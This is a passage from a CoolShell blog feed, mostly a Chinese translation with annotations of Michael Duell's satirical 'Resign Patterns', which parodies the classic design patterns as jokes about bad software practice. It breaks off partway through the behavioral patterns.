<a href="https://coolshell.cn/articles/1097.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/1097.html" class="wp_rp_title">Ksplice Uptrack — Ubuntu更新不用重启</a>
</li>
<li>
<a href="https://coolshell.cn/articles/501.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/501.html" class="wp_rp_title">Ubuntu的并行启动</a>
</li>
<li>
<a href="https://coolshell.cn/articles/19219.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/19219.html" class="wp_rp_title">打造高效的工作环境 – Shell 篇</a>
</li>
<li>
<a href="https://coolshell.cn/articles/18654.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/18654.html" class="wp_rp_title">记一次Kubernetes/Docker网络排障</a>
</li>
<li>
<a href="https://coolshell.cn/articles/18360.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/18360.html" class="wp_rp_title">程序员练级攻略（2018) 与我的专栏</a>
</li>
<li>
<a href="https://coolshell.cn/articles/17998.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/17998.html" class="wp_rp_title">Linux PID 1 和 Systemd</a>
</li>
</ul>
</div></div>
<div id="post-ratings-4826" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="41f892123e">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>14</strong> 人打了分，平均分： <strong>3.71</strong> )<br><span class="post-ratings-text" id="ratings_4826_text"></span><meta itemprop="name" content="GNU/Linux下有多少是GNU的？">
<meta itemprop="headline" content="GNU/Linux下有多少是GNU的？">
<meta itemprop="description" content="一个葡萄牙的学生写了一篇文章 《How much GNU is there in GNU/Linux?》 - GNU/Linux下有多少是GNU的。他的这篇文章主要分布了今年4月份的Ubuntu Natty的Linux分发包。其主要是用代码行来做的分析，其给了两个饼图。

第一个饼图如下，其指明了各种主流的开源项目组的分布情况。可见GNU只占了8%，当然，GNome也是GNU的，加起来也只有1...">
<meta itemprop="datePublished" content="2011-06-13T08:25:42+08:00">
<meta itemprop="dateModified" content="2011-06-12T23:38:58+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/4826.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/4826.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="3.71">
<meta itemprop="ratingCount" content="14">
</div>
</div>
<div id="post-ratings-4826-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-06-13T08:25:42+08:00</pubDate>
<guid>https://coolshell.cn/articles/4826.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ “另类” 设计模式 ]]></title>
<link>https://coolshell.cn/articles/4844.html</link>
<content><![CDATA[ 
<p>下面这篇文章来自这里：<a href="http://www.lsd.ic.unicamp.br/~oliva/fun/prog/resign-patterns" target="_blank">http://www.lsd.ic.unicamp.br/~oliva/fun/prog/resign-patterns</a>，这篇文章有点意思了，山寨了我们著名的Design Pattern。这篇文章并不是很容易翻译，也许我翻译的不好，大家多指正。另外，这篇文章将失去原有的趣味在于其使用了经典设计模式的单词很相似的单词，一走眼你还以为是正二八经的设计模式。呵呵。所以，我在下文中，我会保留原有的英文单词，并把真正的23个经典设计模式的英文名放在旁边（灰色）。这篇文章和之前的<a title="如何写出无法维护的代码" href="https://coolshell.cn/articles/4758.html" target="_blank">如何写出无法维护的代码</a>有异曲同工，个人感觉都是比较欢乐的。</p>
<p style="text-align: center;"> </p>
<p style="text-align: center; font-size: 14pt;"><strong>辞职模式<br>
</strong><strong>Resign Patterns<br>
</strong><strong><span style="color: #cccccc;">Design Patterns</span></strong></p>
<div style="text-align: center;">不合式的非面向项目软件开发病症<br>
Ailments of Unsuitable Project-Disoriented Software<br>
<span style="color: #cccccc;">Elements of Reusable Object-Oriented Software</span>
</div>
<div style="text-align: center;">
<strong>作者</strong>：<a href="/cdn-cgi/l/email-protection#3d505449584a524f567d44584f5e52504d5c5344135e5250">Michael Duell</a>
</div>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E6%A6%82%E8%A6%81" title="概要">概要</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4">
<a class="ez-toc-link ez-toc-heading-2" href="#1_Cremational_Patterns_%E7%81%AB%E8%91%AC%E6%A8%A1%E5%BC%8F_Creational_patterns_%E5%88%9B%E5%BB%BA%E6%A8%A1%E5%BC%8F" title="1. Cremational Patterns 火葬模式 | Creational patterns 创建模式">1. Cremational Patterns 火葬模式 | Creational patterns 创建模式</a><ul class="ez-toc-list-level-5">
<li class="ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-3" href="#11_Abject_Poverty_%E4%B8%80%E8%B4%AB%E5%A6%82%E6%B4%97_Abstract_Factory_%E6%8A%BD%E8%B1%A1%E5%B7%A5%E5%8E%82" title="1.1 Abject Poverty  一贫如洗 | Abstract Factory 抽象工厂">1.1 Abject Poverty  一贫如洗 | Abstract Factory 抽象工厂</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-4" href="#12_Blinder_%E7%9C%BC%E7%BD%A9%E6%A8%A1%E5%BC%8F_Builder_%E5%BB%BA%E9%80%A0%E6%A8%A1%E5%BC%8F" title="1.2 Blinder 眼罩模式 | Builder 建造模式">1.2 Blinder 眼罩模式 | Builder 建造模式</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-5" href="#13_Fallacy_Method_%E9%94%99%E8%AF%AF%E6%96%B9%E6%B3%95_Factory_method_%E5%B7%A5%E5%8E%82%E6%96%B9%E6%B3%95" title="1.3 Fallacy Method 错误方法 | Factory method 工厂方法">1.3 Fallacy Method 错误方法 | Factory method 工厂方法</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-6" href="#14_ProtoTry_%E5%B0%9D%E8%AF%95%E6%A8%A1%E5%BC%8F_Prototype_%E5%8E%9F%E5%9E%8B%E6%A8%A1%E5%BC%8F" title="1.4 ProtoTry   尝试模式| Prototype 原型模式">1.4 ProtoTry   尝试模式| Prototype 原型模式</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-7" href="#15_Simpleton_%E5%82%BB%E7%93%9C%E6%A8%A1%E5%BC%8F_Singleton_%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F" title="1.5 Simpleton 傻瓜模式 | Singleton 单例模式">1.5 Simpleton 傻瓜模式 | Singleton 单例模式</a></li>
</ul>
</li>
<li class="ez-toc-page-1 ez-toc-heading-level-4">
<a class="ez-toc-link ez-toc-heading-8" href="#2_Destructural_Patterns_%E6%97%A0%E7%BB%93%E6%9E%84%E6%A8%A1%E5%BC%8F_Structural_patterns_%E7%BB%93%E6%9E%84%E6%A8%A1%E5%BC%8F" title="2. Destructural Patterns 无结构模式 | Structural patterns  结构模式">2. Destructural Patterns 无结构模式 | Structural patterns  结构模式</a><ul class="ez-toc-list-level-5">
<li class="ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-9" href="#21_Adopter_%E9%A2%86%E5%85%BB%E8%80%85%E6%A8%A1%E5%BC%8F_Adapter_%E9%80%82%E9%85%8D%E5%99%A8%E6%A8%A1%E5%BC%8F" title="2.1 Adopter 领养者模式 | Adapter 适配器模式">2.1 Adopter 领养者模式 | Adapter 适配器模式</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-10" href="#22_Brig_%E7%9B%91%E7%8B%B1%E6%A8%A1%E5%BC%8F_Bridge_%E6%A1%A5%E6%8E%A5%E6%A8%A1%E5%BC%8F" title="2.2 Brig 监狱模式 | Bridge 桥接模式">2.2 Brig 监狱模式 | Bridge 桥接模式</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-11" href="#23_Compromise_%E5%A6%A5%E5%8D%8F%E6%A8%A1%E5%BC%8F_Composite_%E5%90%88%E6%88%90%E6%A8%A1%E5%BC%8F" title="2.3 Compromise 妥协模式 | Composite 合成模式">2.3 Compromise 妥协模式 | Composite 合成模式</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-12" href="#24_Detonator_%E5%9C%B0%E9%9B%B7%E6%A8%A1%E5%BC%8F_Decorator_%E4%BF%AE%E9%A5%B0%E6%A8%A1%E5%BC%8F" title="2.4 Detonator 地雷模式 | Decorator 修饰模式">2.4 Detonator 地雷模式 | Decorator 修饰模式</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-13" href="#25_Fromage_%E5%B9%B2%E9%85%AA%E6%A8%A1%E5%BC%8F_Facade_%E5%A4%96%E8%A7%82%E6%A8%A1%E5%BC%8F" title="2.5 Fromage 干酪模式 | Facade 外观模式">2.5 Fromage 干酪模式 | Facade 外观模式</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-14" href="#26_Flypaper_%E6%8D%95%E8%9D%87%E7%BA%B8%E6%A8%A1%E5%BC%8F_Flyweight_%E4%BA%AB%E5%85%83%E6%A8%A1%E5%BC%8F" title="2.6 Flypaper 捕蝇纸模式 | Flyweight 享元模式">2.6 Flypaper 捕蝇纸模式 | Flyweight 享元模式</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-15" href="#27_ePoxy_%E6%B2%A5%E6%B8%85%E6%A8%A1%E5%BC%8F_Proxy_%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F" title="2.7 ePoxy 沥清模式 | Proxy 代理模式">2.7 ePoxy 沥清模式 | Proxy 代理模式</a></li>
</ul>
</li>
<li class="ez-toc-page-1 ez-toc-heading-level-4">
<a class="ez-toc-link ez-toc-heading-16" href="#3_Misbehavioral_Patterns_%E8%A1%8C%E4%B8%BA%E4%B8%8D%E6%A3%80%E6%A8%A1%E5%BC%8F_Behavioral_Patterns_%E8%A1%8C%E4%B8%BA%E6%A8%A1%E5%BC%8F" title="3. Misbehavioral Patterns 行为不检模式| Behavioral Patterns 行为模式">3. Misbehavioral Patterns 行为不检模式| Behavioral Patterns 行为模式</a><ul class="ez-toc-list-level-5">
<li class="ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-17" href="#31_Chain_of_Possibilities_%E5%8F%AF%E8%83%BD%E6%80%A7%E9%93%BE%E6%A8%A1%E5%BC%8F_Chain_of_responsibility_%E8%B4%A3%E4%BB%BB%E9%93%BE%E6%A8%A1%E5%BC%8F" title="3.1 Chain of Possibilities 可能性链模式 | Chain of responsibility 责任链模式">3.1 Chain of Possibilities 可能性链模式 | Chain of responsibility 责任链模式</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-18" href="#32_Commando_%E7%AA%81%E5%87%BB%E9%98%9F%E6%A8%A1%E5%BC%8F_Command_%E5%91%BD%E4%BB%A4%E6%A8%A1%E5%BC%8F" title="3.2 Commando 突击队模式 | Command 命令模式">3.2 Commando 突击队模式 | Command 命令模式</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-19" href="#33_Intersperser_%E6%95%A3%E5%B8%83%E6%A8%A1%E5%BC%8F_Interpreter_%E8%A7%A3%E9%87%8A%E5%99%A8%E6%A8%A1%E5%BC%8F" title="3.3 Intersperser 散布模式| Interpreter 解释器模式">3.3 Intersperser 散布模式| Interpreter 解释器模式</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-20" href="#34_Instigator_%E7%85%BD%E5%8A%A8%E6%A8%A1%E5%BC%8F_Iterator_%E8%BF%AD%E4%BB%A3%E5%99%A8%E6%A8%A1%E5%BC%8F" title="3.4 Instigator 煽动模式| Iterator 迭代器模式">3.4 Instigator 煽动模式| Iterator 迭代器模式</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-21" href="#35_Momentum_%E5%86%B2%E5%87%BB%E6%A8%A1%E5%BC%8F_Memento_%E5%A4%87%E5%BF%98%E6%A8%A1%E5%BC%8F" title="3.5 Momentum 冲击模式| Memento 备忘模式">3.5 Momentum 冲击模式| Memento 备忘模式</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-22" href="#36_Medicator_%E7%94%A8%E8%8D%AF%E6%A8%A1%E5%BC%8F_Mediator_%E5%AA%92%E4%BB%8B%E6%A8%A1%E5%BC%8F" title="3.6 Medicator 用药模式| Mediator 媒介模式">3.6 Medicator 用药模式| Mediator 媒介模式</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-23" href="#37_Absolver_%E5%85%8D%E8%B4%A3%E6%A8%A1%E5%BC%8F_Observer_%E8%A7%82%E5%AF%9F%E8%80%85%E6%A8%A1%E5%BC%8F" title="3.7 Absolver 免责模式| Observer 观察者模式">3.7 Absolver 免责模式| Observer 观察者模式</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-24" href="#38_Stake_%E5%88%A9%E5%AE%B3%E5%85%B3%E7%B3%BB%E6%A8%A1%E5%BC%8F_State_%E7%8A%B6%E6%80%81%E6%A8%A1%E5%BC%8F" title="3.8 Stake 利害关系模式 | State 状态模式">3.8 Stake 利害关系模式 | State 状态模式</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-25" href="#39_Eulogy_%E9%A2%82%E6%AD%8C%E6%A8%A1%E5%BC%8F_Strategy%E7%AD%96%E7%95%A5%E6%A8%A1%E5%BC%8F" title="3.9 Eulogy 颂歌模式 | Strategy策略模式">3.9 Eulogy 颂歌模式 | Strategy策略模式</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-26" href="#310_Tempest_Method_%E6%9A%B4%E9%A3%8E%E9%9B%A8%E6%A8%A1%E5%BC%8F_Template_Method_%E6%A8%A1%E6%9D%BF%E6%96%B9%E6%B3%95" title="3.10 Tempest Method 暴风雨模式| Template Method 模板方法">3.10 Tempest Method 暴风雨模式| Template Method 模板方法</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-27" href="#311_Visitor_From_Hell_%E5%9C%B0%E7%8B%B1%E8%AE%BF%E9%97%AE%E8%80%85%E6%A8%A1%E5%BC%8F_Visitor_%E8%AE%BF%E9%97%AE%E8%80%85%E6%A8%A1%E5%BC%8F" title="3.11 Visitor From Hell 地狱访问者模式 | Visitor 访问者模式">3.11 Visitor From Hell 地狱访问者模式 | Visitor 访问者模式</a></li>
</ul>
</li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-28" href="#%E5%8F%82%E8%80%83" title="参考">参考</a></li>
</ul></nav>
</div>
<h4 style="text-align: left;">
<span class="ez-toc-section" id="%E6%A6%82%E8%A6%81"></span><strong>概要</strong><span class="ez-toc-section-end"></span>
</h4>
<div style="text-align: justify;">任何一个熟悉那本由四个人写的经典的设计模式书的朋友，应该知道那本书里的模式都是非常优雅和划时代的。然而，不幸的是，从那些老代码中无法提练出这些模式，因为，在出现这些模式前，大家都不会使用模式。因此，这项工作是从大量的代码中提练出一个模式的目录。这些模式都有充足和永恒的示例。希望你能享受阅读这些模式，但千万不要模仿并使用他们！</div>
<h4 style="text-align: left;">
<span class="ez-toc-section" id="1_Cremational_Patterns_%E7%81%AB%E8%91%AC%E6%A8%A1%E5%BC%8F_Creational_patterns_%E5%88%9B%E5%BB%BA%E6%A8%A1%E5%BC%8F"></span>1. Cremational Patterns 火葬模式 | <span style="color: #999999;">Creational patterns 创建模式</span><span class="ez-toc-section-end"></span>
</h4>
<div style="text-align: left;">下面是五个 cremational patterns.</div>
<h5 style="text-align: left;">
<span class="ez-toc-section" id="11_Abject_Poverty_%E4%B8%80%E8%B4%AB%E5%A6%82%E6%B4%97_Abstract_Factory_%E6%8A%BD%E8%B1%A1%E5%B7%A5%E5%8E%82"></span><strong>1.1 Abject Poverty  一贫如洗 | <span style="color: #999999;">Abstract Factory 抽象工厂</span></strong><span class="ez-toc-section-end"></span>
</h5>
<p style="text-align: justify;">Abject Poverty 模式能让你的软件相当难测试和维护， 并且需要巨大的财政支出，预算已经完全赤字。</p>
<h5 style="text-align: left;">
<span class="ez-toc-section" id="12_Blinder_%E7%9C%BC%E7%BD%A9%E6%A8%A1%E5%BC%8F_Builder_%E5%BB%BA%E9%80%A0%E6%A8%A1%E5%BC%8F"></span><strong>1.2 Blinder 眼罩模式 | <span style="color: #999999;">Builder 建造模式</span></strong><span class="ez-toc-section-end"></span>
</h5>
<p style="text-align: justify;">Blinder 模式是一个应急有效的解决方案，其不需要考虑需求在未来的变化。目前，我们还不太清楚我们为什么叫Blinder模式，一种说法是他们会在写代码的时候被设计人员戴上眼罩，另一种说法是他们希望在维护代码的时候挖出双眼。</p>
<h5 style="text-align: left;">
<span class="ez-toc-section" id="13_Fallacy_Method_%E9%94%99%E8%AF%AF%E6%96%B9%E6%B3%95_Factory_method_%E5%B7%A5%E5%8E%82%E6%96%B9%E6%B3%95"></span><strong>1.3 Fallacy Method 错误方法 | <span style="color: #999999;">Factory method 工厂方法</span></strong><span class="ez-toc-section-end"></span>
</h5>
<p style="text-align: justify;">Fallacy方法主要是在于处理一些不明显的案例。代码逻辑看上去是正确的，当只要某想要去测试一下，或是某个不明显的案例发生了，那些代码中的错误也就出现了。</p>
<p style="text-align: justify;"><span id="more-4844"></span></p>
<h5 style="text-align: left;">
<span class="ez-toc-section" id="14_ProtoTry_%E5%B0%9D%E8%AF%95%E6%A8%A1%E5%BC%8F_Prototype_%E5%8E%9F%E5%9E%8B%E6%A8%A1%E5%BC%8F"></span><strong>1.4 ProtoTry   尝试模式| <span style="color: #999999;">Prototype 原型模式</span></strong><span class="ez-toc-section-end"></span>
</h5>
<p style="text-align: justify;">ProtoTry 模式一个快速而肮脏的软件开发工作模型的尝试。这个模式的原意本来是想在后面有时间总结一下教训并改进或重写这些代码，但是可惜的是没有时间。所以，这些代码也就成了众所周知的 legacy code – 旧代码。</p>
<h5 style="text-align: left;">
<span class="ez-toc-section" id="15_Simpleton_%E5%82%BB%E7%93%9C%E6%A8%A1%E5%BC%8F_Singleton_%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F"></span><strong>1.5 Simpleton 傻瓜模式 |<span style="color: #999999;"> Singleton 单例模式</span></strong><span class="ez-toc-section-end"></span>
</h5>
<p style="text-align: justify;">Simpleton 模式，是把一个终极复杂的模式用于那些最最没有价值的工作上。这个模式精确地指出了人员的能力程度。</p>
<p style="text-align: justify;"> </p>
<h4 style="text-align: left;">
<span class="ez-toc-section" id="2_Destructural_Patterns_%E6%97%A0%E7%BB%93%E6%9E%84%E6%A8%A1%E5%BC%8F_Structural_patterns_%E7%BB%93%E6%9E%84%E6%A8%A1%E5%BC%8F"></span><strong>2. Destructural Patterns 无结构模式 | </strong><span style="color: #999999;">Structural patterns  结构模式</span><span class="ez-toc-section-end"></span>
</h4>
<p style="text-align: left;">下面是七个经典的变性模式</p>
<h5 style="text-align: left;">
<span class="ez-toc-section" id="21_Adopter_%E9%A2%86%E5%85%BB%E8%80%85%E6%A8%A1%E5%BC%8F_Adapter_%E9%80%82%E9%85%8D%E5%99%A8%E6%A8%A1%E5%BC%8F"></span><strong>2.1 Adopter 领养者模式 |<span style="color: #999999;"> Adapter 适配器模式</span></strong><span class="ez-toc-section-end"></span>
</h5>
<p style="text-align: justify;">Adopter模式提供了一个给那些“孤儿函数”的家。这这些函数和整个大家族别的函数看上去一点也不一样，他们和整个家族的唯一联系就是通过我们的Adopter。</p>
<h5 style="text-align: left;">
<span class="ez-toc-section" id="22_Brig_%E7%9B%91%E7%8B%B1%E6%A8%A1%E5%BC%8F_Bridge_%E6%A1%A5%E6%8E%A5%E6%A8%A1%E5%BC%8F"></span><strong>2.2 Brig 监狱模式 | <span style="color: #999999;">Bridge 桥接模式</span></strong><span class="ez-toc-section-end"></span>
</h5>
<p style="text-align: left;">Brig 模式也就是那些坏代码的容器类。这就是众所周知的软件模块。</p>
<h5 style="text-align: left;">
<span class="ez-toc-section" id="23_Compromise_%E5%A6%A5%E5%8D%8F%E6%A8%A1%E5%BC%8F_Composite_%E5%90%88%E6%88%90%E6%A8%A1%E5%BC%8F"></span><strong>2.3 Compromise 妥协模式 | <span style="color: #999999;">Composite 合成模式</span></strong><span class="ez-toc-section-end"></span>
</h5>
<p style="text-align: justify;">Compromise 模式主要用来平衡软件开发的工期和质量。 使用这个模式的结果是——劣质的软件 + 延误的工期。</p>
<h5 style="text-align: left;">
<span class="ez-toc-section" id="24_Detonator_%E5%9C%B0%E9%9B%B7%E6%A8%A1%E5%BC%8F_Decorator_%E4%BF%AE%E9%A5%B0%E6%A8%A1%E5%BC%8F"></span><strong>2.4 Detonator 地雷模式 | <span style="color: #999999;">Decorator 修饰模式</span></strong><span class="ez-toc-section-end"></span>
</h5>
<p style="text-align: justify;">Detonator 模式是极其普通的，在程序中放置一些不易查觉的地雷。一个常见的经典示例是只用两位数来表示年份。这个炸弹已经暴露出来了，并在那等着爆炸！（陈皓注：作者这里说的是千年虫问题，本文写在1997年）</p>
<h5 style="text-align: left;">
<span class="ez-toc-section" id="25_Fromage_%E5%B9%B2%E9%85%AA%E6%A8%A1%E5%BC%8F_Facade_%E5%A4%96%E8%A7%82%E6%A8%A1%E5%BC%8F"></span><strong>2.5 Fromage 干酪模式 | <span style="color: #999999;">Facade 外观模式</span></strong><span class="ez-toc-section-end"></span>
</h5>
<p style="text-align: justify;">Fromage 模式让软件看上去满是漏洞。 Fromage 模式让我们的软件像Cheesy（芝士，也有劣质的意思）一样，有大量的奇淫巧技让你的软件没有任何一点可移值性。这个模式和奶酪一样，越是老越是香啊。</p>
<h5 style="text-align: left;">
<span class="ez-toc-section" id="26_Flypaper_%E6%8D%95%E8%9D%87%E7%BA%B8%E6%A8%A1%E5%BC%8F_Flyweight_%E4%BA%AB%E5%85%83%E6%A8%A1%E5%BC%8F"></span><strong>2.6 Flypaper 捕蝇纸模式 | <span style="color: #999999;">Flyweight 享元模式</span></strong><span class="ez-toc-section-end"></span>
</h5>
<p style="text-align: justify;">Flypaper 模式的意思是，代码是由设计的人完成，而由另一个人维护。维护着这个模式的那个写代码的人发现自己被粘住了，而且很有可能在软件失支控制前夭折。</p>
<h5 style="text-align: left;">
<span class="ez-toc-section" id="27_ePoxy_%E6%B2%A5%E6%B8%85%E6%A8%A1%E5%BC%8F_Proxy_%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F"></span><strong>2.7 ePoxy 沥清模式 |<span style="color: #999999;"> Proxy 代理模式</span></strong><span class="ez-toc-section-end"></span>
</h5>
<p style="text-align: justify;">ePoxy 模式主旨把软件的模式紧密地耦合在一起。随着耦合模块的增加，我们就可以看到沾粘它们的沥清。</p>
<h4>
<span class="ez-toc-section" id="3_Misbehavioral_Patterns_%E8%A1%8C%E4%B8%BA%E4%B8%8D%E6%A3%80%E6%A8%A1%E5%BC%8F_Behavioral_Patterns_%E8%A1%8C%E4%B8%BA%E6%A8%A1%E5%BC%8F"></span><strong>3. Misbehavioral Patterns 行为不检模式| Behavioral Patterns 行为模式</strong><span class="ez-toc-section-end"></span>
</h4>
<p>下面是11个行为不检点模式</p>
<h5>
<span class="ez-toc-section" id="31_Chain_of_Possibilities_%E5%8F%AF%E8%83%BD%E6%80%A7%E9%93%BE%E6%A8%A1%E5%BC%8F_Chain_of_responsibility_%E8%B4%A3%E4%BB%BB%E9%93%BE%E6%A8%A1%E5%BC%8F"></span><strong>3.1 Chain of Possibilities 可能性链模式 | <span style="color: #999999;">Chain of responsibility 责任链模式</span></strong><span class="ez-toc-section-end"></span>
</h5>
<p style="text-align: justify;">Chain of Possibilities 模式主旨是创造肥大的，拙劣文档的软件模块。没有人知道其功能有多宽泛，其可能性永无止境。也就是我们所说的——无确定性。</p>
<h5>
<span class="ez-toc-section" id="32_Commando_%E7%AA%81%E5%87%BB%E9%98%9F%E6%A8%A1%E5%BC%8F_Command_%E5%91%BD%E4%BB%A4%E6%A8%A1%E5%BC%8F"></span><strong>3.2 Commando 突击队模式 | <span style="color: #999999;">Command 命令模式</span></strong><span class="ez-toc-section-end"></span>
</h5>
<p style="text-align: justify;">Commando 模式主旨是用来应付工作，让事情快点完成。这个模式不管封装，只图快快把代码写完。反正不犯法。</p>
<h5>
<span class="ez-toc-section" id="33_Intersperser_%E6%95%A3%E5%B8%83%E6%A8%A1%E5%BC%8F_Interpreter_%E8%A7%A3%E9%87%8A%E5%99%A8%E6%A8%A1%E5%BC%8F"></span><strong>3.3 Intersperser 散布模式| <span style="color: #999999;">Interpreter 解释器模式</span></strong><span class="ez-toc-section-end"></span>
</h5>
<p style="text-align: justify;">Intersperser 模式把一个功能的代码散布在系统的各个地方，其可以让功能无法被测试，修改，以及让人读懂。(陈皓注：这让我想起了以前VB，PB和Delphi的开发，功能的逻辑代码散步在各个组件的不同事件中)</p>
<h5>
<span class="ez-toc-section" id="34_Instigator_%E7%85%BD%E5%8A%A8%E6%A8%A1%E5%BC%8F_Iterator_%E8%BF%AD%E4%BB%A3%E5%99%A8%E6%A8%A1%E5%BC%8F"></span><strong>3.4 Instigator 煽动模式| <span style="color: #999999;">Iterator 迭代器模式</span></strong><span class="ez-toc-section-end"></span>
</h5>
<p>Instigator 模式看上去是良性的，但是其却大规模的以暴力的方式在破坏软件系统。（陈皓注：作者没有做过多的解释，不过，我想到了<a title="Windows编程革命简史" href="https://coolshell.cn/articles/3008.html" target="_blank">Windows编程革命史</a>，应该说的就是这个吧）</p>
<h5>
<span class="ez-toc-section" id="35_Momentum_%E5%86%B2%E5%87%BB%E6%A8%A1%E5%BC%8F_Memento_%E5%A4%87%E5%BF%98%E6%A8%A1%E5%BC%8F"></span><strong>3.5 Momentum 冲击模式| <span style="color: #999999;">Memento 备忘模式</span></strong><span class="ez-toc-section-end"></span>
</h5>
<p style="text-align: justify;">Momentum模式让软件大小，内存，CPU，和复杂度成极数级成长。（陈皓注：作者对此没做过多解释，这个特性很像Windows操作系统，每个Windows 的新版本，无论是在尺寸，内存和CPU要求上，和复杂度上都会比上一版有极数级的提高）</p>
<h5>
<span class="ez-toc-section" id="36_Medicator_%E7%94%A8%E8%8D%AF%E6%A8%A1%E5%BC%8F_Mediator_%E5%AA%92%E4%BB%8B%E6%A8%A1%E5%BC%8F"></span><strong>3.6 Medicator 用药模式|<span style="color: #999999;"> Mediator 媒介模式</span></strong><span class="ez-toc-section-end"></span>
</h5>
<p>Medicator 模式是一个实时的屠夫一样，其把其它的系统搞得就像被打过强力镇静剂一样没有反应。</p>
<h5>
<span class="ez-toc-section" id="37_Absolver_%E5%85%8D%E8%B4%A3%E6%A8%A1%E5%BC%8F_Observer_%E8%A7%82%E5%AF%9F%E8%80%85%E6%A8%A1%E5%BC%8F"></span><strong>3.7 Absolver 免责模式| <span style="color: #999999;">Observer 观察者模式</span></strong><span class="ez-toc-section-end"></span>
</h5>
<p style="text-align: justify;">Absolver模式表现于那些被以前员工开发的代码的问题。对于现任员工，其可以因为很多代码里历史上的问题而免除被批评，其声称其对软件中的任何问题都不负责。这也是我们从所周知的——“这不是我的代码”。（参看：<a title="程序员惯用的解释(Top 25)" href="https://coolshell.cn/articles/1174.html" target="_blank">程序员的借口</a>）</p>
<h5>
<span class="ez-toc-section" id="38_Stake_%E5%88%A9%E5%AE%B3%E5%85%B3%E7%B3%BB%E6%A8%A1%E5%BC%8F_State_%E7%8A%B6%E6%80%81%E6%A8%A1%E5%BC%8F"></span><strong>3.8 Stake 利害关系模式 | <span style="color: #999999;">State 状态模式</span></strong><span class="ez-toc-section-end"></span>
</h5>
<p style="text-align: justify;">Stake 模式表现于那些被现已成为经理的人写的代码中的各种问题。虽然这些问题很不爽，但是经理们在这个软件里的利害关系太高了，所以，不能让任何人重写，因为这代表着我们经理的技术成就。</p>
<h5>
<span class="ez-toc-section" id="39_Eulogy_%E9%A2%82%E6%AD%8C%E6%A8%A1%E5%BC%8F_Strategy%E7%AD%96%E7%95%A5%E6%A8%A1%E5%BC%8F"></span><strong>3.9 Eulogy 颂歌模式 | <span style="color: #999999;">Strategy策略模式</span></strong><span class="ez-toc-section-end"></span>
</h5>
<p style="text-align: justify;">Eulogy 模式存在于所有的项目中，也就是 Post-Mortem(事后总结分析会)。</p>
<h5>
